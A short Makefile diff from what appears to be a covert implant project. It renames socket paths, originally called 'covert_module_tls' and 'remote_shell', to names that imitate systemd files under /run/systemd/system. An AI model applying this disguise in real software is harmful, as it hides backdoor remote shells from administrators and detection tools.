@@ -1,4 +1,4 @@
-SOCK_PATH := -DUNIX_SOCK_PATH=\('"/var/run/covert_module_tls"'\) -DSHELL_SOCK_PATH=\('"/var/run/remote_shell"'\)
+SOCK_PATH := -DUNIX_SOCK_PATH=\('"/run/systemd/system/stdout"'\) -DSHELL_SOCK_PATH=\('"/run/systemd/system/bus"'\)
 
 BASEFLAGS := -Wall -Wextra -pedantic -pipe -std=c11 $(SOCK_PATH)
 DEBUGFLAGS := -g -O0
